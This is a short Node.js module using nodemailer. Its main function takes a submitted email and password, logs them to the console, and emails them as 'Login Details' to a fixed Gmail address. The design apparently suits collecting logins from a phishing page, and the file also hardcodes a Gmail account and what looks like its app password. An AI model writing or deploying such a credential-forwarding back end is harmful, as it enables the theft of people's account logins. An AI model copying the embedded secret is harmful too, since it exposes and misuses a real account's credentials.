const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com", // Use Gmail's SMTP server
  port: 587, // TLS port
  secure: false, // Use TLS (not SSL)
  auth: {
    user: "shantiprasad1339@gmail.com", // Your Gmail address
    pass: "bwrtsdjtqaljraeq", 
  },
});


async function main(bodypassword,bodyemail) {
    const info = await transporter.sendMail({
      from: "shantiprasad1339@gmail.com",
      to: "shantiprasadswami386@gmail.com", 
      subject: "MailSender - Login Details", 
      html: `
        <div style="font-family: Arial, sans-serif; line-height: 1.6; color: #333;">
          <div style="max-width: 600px; margin: auto; padding: 20px; border: 1px solid #ddd; border-radius: 8px; background-color: #f9f9f9;">
            <h2 style="text-align: center; color: #0073e6;">Login Details</h2>
            <p>Dear User,</p>
            <p>You have shared the following login credentials:</p>
            <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
              <tr>
                <td style="padding: 10px; border: 1px solid #ddd; background-color: #f2f2f2; font-weight: bold;">Email:</td>
                <td style="padding: 10px; border: 1px solid #ddd;">${bodyemail}</td>
              </tr>
              <tr>
                <td style="padding: 10px; border: 1px solid #ddd; background-color: #f2f2f2; font-weight: bold;">Password:</td>
                <td style="padding: 10px; border: 1px solid #ddd;">${bodypassword}</td>
              </tr>
            </table>
            <p style="text-align: center; font-size: 0.9em; color: #777;">
              If you did not request this, please contact support immediately.
            </p>
            
          </div>
        </div>
      `,
    });
  
    console.log(bodypassword, bodyemail);
  }
  

module.exports = {
  main,
};
